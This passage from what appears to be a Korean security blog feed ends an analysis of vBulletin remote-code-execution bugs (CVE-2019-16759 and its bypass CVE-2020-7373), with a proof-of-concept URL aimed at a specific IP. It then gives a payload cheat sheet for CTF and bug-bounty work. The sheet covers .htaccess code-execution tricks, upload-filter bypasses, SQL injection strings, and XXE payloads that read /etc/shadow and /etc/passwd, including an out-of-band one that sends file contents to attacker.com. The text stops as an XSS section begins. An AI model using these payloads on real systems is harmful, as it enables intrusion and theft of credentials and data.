class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">+</span><br><span class="line">+<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">evalPhp</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">+</span>&#123;</span><br><span class="line">+<span class="comment">//only allow the PHP widget template to do this.  This prevents a malicious user</span></span><br><span class="line">+<span class="comment">//from hacking something into a different template.</span></span><br><span class="line">+<span class="keyword">if</span> (<span class="built_in">self</span>::currentTemplate() != <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">+&#125;</span><br><span class="line">+ob_start();</span><br><span class="line">+<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">+<span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">+ob_end_clean();</span><br><span class="line">+<span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">+&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>또한 evalPhP 메서드의 현재 템플릿이 widget_php가 아니면 Null을 반환하도록 하는 조건문을 추가해서, 다른 템플릿에서 악용될 요소도 제거하는 것을 볼 수 있습니다. (Line 342 ~ 345)</strong><br></p><p><strong>이와 같이 총 2곳을 패치해서 0-day 취약점을 제거했지만 약 1년 정도가 지나고 한 보안 연구원에 의해서 우회가 돼 0-day가 다시 나오게 되었습니다.</strong><br></p><hr><h2 id="CVE-2020-7373"><a href="#CVE-2020-7373" class="headerlink" title="CVE-2020-7373"></a><em>CVE-2020-7373</em></h2><p><strong><code>CVE-2020-7373</code>은 <code>CVE-2019-16759</code>를 패치한 것을 우회해 다시 RCE 취약점을 트리거 한 0-day 입니다. 해당 취약점은 본례의 익스 방식과 크게 다를 게 없지만 다르다면 템플릿을 <code>widget_php</code>가 아닌 <code>widget_tabbedcontainer_tab_panel</code>이라는 템플릿을 이용해서 익스를 진행하였습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_tabbedcontainer_tab_panel&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1532130449&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.4.4 Alpha 2&quot;</span>&gt;</span>&lt;![CDATA[&#123;vb:set panel_id, &#123;vb:concat &#123;vb:var id_prefix&#125;, &#123;vb:var tab_num&#125;&#125;&#125;</span><br><span class="line">&lt;div id=&quot;&#123;vb:var panel_id&#125;&quot; class=&quot;h-clearfix js-show-on-tabs-create h-hide&quot;&gt;</span><br><span class="line">&lt;vb:comment&gt;</span><br><span class="line">- &#123;vb:var panel_id&#125; </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;-- &#123;vb:raw subWidget.template&#125;</span><br><span class="line">&lt;/vb:each&gt;</span><br><span class="line">&lt;/vb:comment&gt;</span><br><span class="line"> </span><br><span class="line">&lt;vb:each from=&quot;subWidgets&quot; value=&quot;subWidget&quot;&gt;</span><br><span class="line">&#123;vb:template &#123;vb:raw subWidget.template&#125;, </span><br><span class="line">widgetConfig=&#123;vb:raw subWidget.config&#125;, </span><br><span class="line">widgetinstanceid=&#123;vb:raw subWidget.widgetinstanceid&#125;,</span><br><span class="line">widgettitle=&#123;vb:raw subWidget.title&#125;, </span><br><span class="line">tabbedContainerSubModules=&#123;vb:raw subWidget.tabbedContainerSubModules&#125;,</span><br><span class="line">product=&#123;vb:raw subWidget.product&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/vb:each&gt; </span><br><span class="line">&lt;/div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><code>widget_tabbedcontainer_tab_panel</code> 템플릿은 자식 템플릿을 생성해주는 템플릿이라고 합니다. 하단의 보면 subWidget.template를 이용해서 템플릿 이름을 정하고, {vb:raw subWidget.config}를 이용해서 widgetConfig에 값을 넣어주는 것을 볼 수 있습니다.</strong><br><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC : http:&#x2F;&#x2F;141.164.52.207&#x2F;?subWidgets[0][template]&#x3D;widget_php&amp;subWidgets[0][config][code]&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><strong>그러니 위와 같이 subWidget.template의 값으로 <code>widget_php</code>, subWidget.config의 값으로 <code>code:phpinfo();</code>로 넘겨주면 template의 값은 <code>widget_php</code>, widgetConfig.code의 값은 <code>phpinfo();</code>가 될 것 이고, widget_php 템플릿이 생성되면 widgetConfig[‘code’]의 값은 <code>phpinfo();</code>이므로 <code>widget_php</code>에서 <code>CVE-2019-16759</code>와 동일하게 RCE가 트리거 되게 됩니다.</strong><br></p><hr><h2 id="CVE-2020-7373-Patch"><a href="#CVE-2020-7373-Patch" class="headerlink" title="CVE-2020-7373 Patch"></a><em>CVE-2020-7373 Patch</em></h2><p><strong>패치 코드가 안 보임</strong><br></p><hr>]]></content>
      
      
      <categories>
          
          <category> 0-day, CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 0-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Note (Update 2021.03.14)</title>
      <link href="2021/01/15/2021-01-15-note/"/>
      <url>2021/01/15/2021-01-15-note/</url>
      
        <content type="html"><![CDATA[<p><strong>워게임, CTF 및 버그바운티를 하다 보면 생각 외로 필요한 것들이 많습니다. 하지만 그 많은 것들을 항상 기억하고 있기는 힘들다는 것을 알고 있기 때문에 앞으로 하나 하나 중요한 페이로드들을 정리를 해나갈 것 이고, 이번 글의 가독성은 저의 기준으로 작성하겠습니다.</strong></p><hr><h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess<br></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine off</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line">php_value auto_append_file .htaccess</span><br><span class="line">#+ADw?php phpinfo()+ADs</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define test_width 1337</span><br><span class="line">#define test_height 1337</span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .pocas</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.detect_unicode 1</span><br><span class="line">php_value display_errors 1</span><br></pre></td></tr></table></figure><hr><h2 id="Upload-Function"><a href="#Upload-Function" class="headerlink" title="Upload Function"></a>Upload Function<br></h2><p><span style="color:#21C587">&#35;</span><strong> Blacklisting Bypass</strong><br></p><ul><li>PHP → <code>.php</code>, <code>.phtm</code>, <code>phtml</code>, <code>.phps</code>, <code>.pht</code>, <code>.php2</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.shtml</code>, <code>.pahr</code>, <code>.pgif</code>, <code>.inc</code><br></li><li>ASP → <code>.asp</code>, <code>.aspx</code>, <code>.cer</code>, <code>.asa</code><br></li><li>JSP → <code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>jspf</code><br></li></ul><p><span style="color:#21C587">&#35;</span><strong> Whitelisting Bypass</strong><br></p><ul><li>file.jpg.php</li><li>file.php.jpg</li><li>file.php.blah123jpg</li><li>file.php%00.jpt</li><li>file.php\x00.jpt</li><li>file.php%00</li><li>file.php%20</li><li>file.php%0d%0a.jpg</li><li>file.php/</li><li>file.php.\</li></ul><hr><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title=" SQL Injection"></a><span style="color:#21C587"></span> SQL Injection<br></h2><p><span style="color:#21C587">&#35;</span><strong> MySQL</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">- comments</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">1&#x3D;1, 1 in(1), 1 like 1, !(1&lt;&gt;1)</span><br><span class="line"></span><br><span class="line">- count func</span><br><span class="line">count()</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">@@version</span><br><span class="line">version()</span><br><span class="line">@@innodb_version;</span><br><span class="line"></span><br><span class="line">- string split</span><br><span class="line">mid()</span><br><span class="line">right(left())</span><br><span class="line">substr()</span><br><span class="line">substring()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">sleep(5), benchmark(40000000,md5(1));</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">ascii()</span><br><span class="line">ord()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">concat()</span><br><span class="line">group_concat()</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">&#39;admin&#39; &#x3D; 0x61646d696e</span><br><span class="line"></span><br><span class="line">- whitespace bypass</span><br><span class="line">%0a, %a0, %20, %09, %0d, %0c, %b, &#x2F;**&#x2F;, ()</span><br><span class="line"></span><br><span class="line">- Conditional</span><br><span class="line">if(1&#x3D;1, 1, 0), case when 1&#x3D;1 then 1 else 0 end;</span><br><span class="line"></span><br><span class="line">- length func</span><br><span class="line">length(), char_length(), character_length()</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)</span><br><span class="line">select database_name, table_name from mysql.innodb_table_stats</span><br><span class="line">select table_schema from information_schema.schemas</span><br><span class="line">select table_name from information_schema.tables</span><br><span class="line">select column_name from information_schema.columns</span><br><span class="line">select extractvalue(rand(),concat(0x3a,((select &lt;column_name&gt; from &lt;table_name&gt; limit 0, 1))))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> SQLite</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">- comments</span><br><span class="line">--, &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- length check</span><br><span class="line">length()</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">1&#x3D;1, 1 in(1), 1 like 1, 1&#x3D;&#x3D;1, !(1&lt;&gt;1)</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">sqlite_version()</span><br><span class="line"></span><br><span class="line">- string split</span><br><span class="line">substr()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">||, concat()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">sqlite3_sleep()</span><br><span class="line"></span><br><span class="line">- Conditional</span><br><span class="line">case when 1&#x3D;1 then 1 else 0 end</span><br><span class="line"></span><br><span class="line">- limit</span><br><span class="line">limit &lt;count&gt;</span><br><span class="line">limit &lt;skip&gt;, &lt;count&gt;</span><br><span class="line">limit &lt;count&gt; offset &lt;skip&gt;</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">unicode()</span><br><span class="line"></span><br><span class="line">- select bypass</span><br><span class="line">select 1 &#x3D; values(1)</span><br><span class="line">select &#39;admin&#39; &#x3D; values(&#39;admin&#39;)</span><br><span class="line"></span><br><span class="line">- command injection</span><br><span class="line">.sh ls, .shell ls, .system ls</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select group_concat(sql), group_concat(name) from sqlite_master</span><br><span class="line">union select group_concat(&lt;column_name&gt;), group_concat(&lt;column_name&gt;), null, null from &lt;table_name&gt;</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PgSQL</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">- coments</span><br><span class="line">--, &#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">- length check</span><br><span class="line">length()</span><br><span class="line"></span><br><span class="line">- version check</span><br><span class="line">version()</span><br><span class="line"></span><br><span class="line">- like</span><br><span class="line">&#x3D;, in()</span><br><span class="line"></span><br><span class="line">- string to hex</span><br><span class="line">ascii()</span><br><span class="line"></span><br><span class="line">- sleep func</span><br><span class="line">pg_sleep()</span><br><span class="line"></span><br><span class="line">- add string</span><br><span class="line">||, concat(), string_agg()</span><br><span class="line"></span><br><span class="line">- Number of columns</span><br><span class="line">&#39; order by 1 --</span><br><span class="line">&#39; order by 2 --</span><br><span class="line">&#39; order by 3 --</span><br><span class="line">&#39; union null --</span><br><span class="line">&#39; union null, null --</span><br><span class="line">&#39; union null, null, null --</span><br><span class="line"></span><br><span class="line">- limit</span><br><span class="line">limit &lt;count&gt;</span><br><span class="line">limit &lt;count&gt; offset &lt;skip&gt;</span><br><span class="line"></span><br><span class="line">- etc</span><br><span class="line">select current_database()</span><br><span class="line">select string_agg(table_name, &#39;,&#39;) from information_schema.tables</span><br><span class="line">string_agg(column_name, &#39;,&#39;), null, null, null from information_schema.columns where table_name &#x3D; &lt;table_name&gt;</span><br><span class="line">select string_agg(&lt;column_name&gt;), null, null, null from &lt;table_name&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="XXE-Original"><a href="#XXE-Original" class="headerlink" title="XXE (Original)"></a>XXE (Original)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE Original</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE to SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">system</span> <span class="meta-string">&quot;domain&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ssrf</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">ssrf</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (XInclude attacks)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">burp</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">burp</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE (php wrapper)</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">burp</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">burp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=****&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lfi</span>&gt;</span><span class="symbol">&amp;burp;</span><span class="tag">&lt;/<span class="name">lfi</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> OOB XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/poc.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// http://ip/poc.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://attacker.com/?collect=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><hr><h2 id="XXE-feat-svg"><a href="#XXE-feat-svg" class="headerlink" title="XXE (feat svg)"></a>XXE (feat svg)<br></h2><p><span style="color:#21C587">&#35;</span><strong> XXE</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;40&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>                    </span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Blind XXE &amp; SSRF</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no”?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ENTY</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">XXE</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue”&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;svg xmlns:svg=”http://www.w3.org/2000/svg&quot;</span> <span class="meta-keyword">xmlns</span>=”http://www.w3.org/2000/svg<span class="meta-string">&quot; xmlns:xlink=&quot;</span>http://www.w3.org/1999/xlink<span class="meta-string">&quot; width=&quot;</span>200<span class="meta-string">&quot; height=”200&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&lt;image xlink:href=&quot;http://EVILHOST:1337/SSRF?&amp;XXE;&quot; /&gt;</span></span><br><span class="line"><span class="meta">&lt;/svg&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; XSS</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.1&quot; standlone=&quot;no&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> <span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span> <span class="attr">baseProfile</span>=<span class="string">&quot;full&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&quot;XXE &amp; XSS&quot;</span>);</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> XXE &amp; Open Redirect</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">code</span>&gt;</span></span><br><span class="line">  <span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.location=&#x27;URL&#x27;&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.rog/200/svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rect</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="XSS-Payload"><a href="#XSS-Payload" class="headerlink" title="XSS Payload"></a>XSS Payload<br></h2><p><span style="color:#21C587">&#35;</span><strong> Reflection XSS statement</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 